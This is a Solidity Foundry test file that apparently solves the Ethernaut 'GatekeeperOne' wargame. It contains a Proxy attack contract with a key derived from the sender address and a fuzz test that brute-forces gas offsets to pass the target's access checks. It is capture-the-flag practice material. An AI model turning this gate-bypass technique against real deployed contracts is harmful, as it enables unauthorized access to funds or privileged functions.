// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
 
import {Test} from "forge-std/Test.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";
import "forge-std/console.sol";


contract Proxy {

    bytes8 _gateKey;
    GatekeeperOne public instance = GatekeeperOne(0x4A142a4Ed855d32bb3810b86F1Ca9785bAf256Fc);

    constructor (uint64 intRep) {
        _gateKey = bytes8(intRep);
    }
    function attack() external {
        instance.enter(_gateKey);
    }
}

contract SafeTest is Test {
    GatekeeperOne instance;
    address pub;
    uint64 intRep;
    Proxy p;

    function setUp() public {
        instance = new GatekeeperOne();
        
    	pub = vm.envAddress("PUB");
        intRep = uint16(uint160(pub));
        intRep |= 1 << 32;

    }
 
    function test_Gate(uint256 gasOffset) public {

        gasOffset = bound(gasOffset, 0, 8191);

        console.log("gasOffset =", gasOffset);
        p = new Proxy(intRep);

        (bool ok, bytes memory result) = address(p).call{gas: 8191*10 + gasOffset}(abi.encodeWithSignature("attack()"));

        assertEq(ok, true);


    }
}